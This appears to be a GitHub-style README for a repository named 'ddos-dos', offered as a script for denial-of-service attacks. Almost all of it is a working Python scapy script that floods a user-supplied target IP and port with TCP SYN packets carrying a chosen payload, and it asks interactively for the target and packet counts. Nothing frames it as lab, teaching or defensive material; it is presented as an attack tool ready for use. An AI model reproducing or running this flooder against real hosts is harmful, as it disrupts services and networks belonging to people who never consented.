# ddos-dos
A script for Dos O ddos attacks

## Usage/Examples

```python 
from scapy.all import *
from random import randint
class DDoSAttack:
    def __init__(self, dst_ip, dport, payload, min_packets, max_packets, verbose=0):
        self.dst_ip = dst_ip
        self.dport = dport
        self.payload = payload
        self.min_packets = min_packets
        self.max_packets = max_packets
        self.verbose = verbose
        self.sport = randint(1024,65535)
        self.timeout = 0
    
    def send_packet(self):
        packet = IP(dst=self.dst_ip)/TCP(sport=self.sport, dport=self.dport, flags="S")/Raw(load=self.payload)
        send(packet, verbose=self.verbose)
    
    def attack(self):
        num_packets = randint(self.min_packets, self.max_packets)
        for i in range(num_packets):
            self.send_packet()
        print(f"Sent {num_packets} attack from port {self.sport} to {self.dst_ip}:{self.dport}")

if __name__ == "__main__":
    dst_ip = input("Enter the target IP: ")
    dport = int(input("Enter the target port: "))
    payload = input("Enter the payload: ")
    min_packets = int(input("Enter the minimum number of packets to send: "))
    max_packets = int(input("Enter the maximum number of packets to send: "))
    verbose = int(input("Set verbosity level (0-4):"))
    attack = DDoSAttack(dst_ip, dport, payload, min_packets, max_packets, verbose)
    attack.attack()
```
